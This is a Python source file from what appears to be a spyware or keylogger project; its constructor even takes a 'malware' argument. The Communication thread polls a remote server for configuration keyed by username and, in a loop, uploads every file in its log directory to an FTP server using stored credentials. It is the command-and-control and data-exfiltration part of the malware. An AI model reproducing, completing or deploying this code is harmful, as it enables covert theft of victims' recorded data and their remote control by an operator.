from Configuration import Configuration
from Util import Util
from threading import Thread
from time import sleep
from requests import get
from json import loads, dumps
from shutil import copy
import ftplib
import os



class Communication(Thread):


    def __init__(self, malware, config:Configuration):
        Thread.__init__(self, name='communication')
        self.__config = config



    def run(self):
        while True:
            sleep(self.__config.communicationFrequency)
            self.getConfigFromServer()
            sleep(self.__config.communicationFrequency)
            self.uploadFilesFTP()



    def getConfigFromServer(self):
        if self.__config.debug:
            print('Connecting to the server...')
        try:
            response = get(url=self.__config.baseURL, params={'username':self.__config.userName})
            data = response.json()
            print(data)
            if data:
                jsonData = dumps(data, ensure_ascii=False)
                Util.fileOut(self.__config.logPath + 'config.json', jsonData, 'w')
                if self.__config.debug:
                    print('Config file has been created!')
                self.__config.setAttributes()
        except Exception:
            print('COMMUNICATION ERROR!')



    def uploadFilesFTP(self):
        try:
            session = ftplib.FTP(self.__config.ftpURL, self.__config.ftpUserName, self.__config.ftpPassword)
            for root, dirs, files in os.walk(self.__config.logPath):
                for filename in files:
                    print(root + filename)
                    file = open(root + filename,'rb')
                    session.storbinary(f'STOR {filename}', file)
                    file.close()                   
            session.quit()
            print('FTP upload successfully finished!')
        except Exception:
            print('FTP error!')

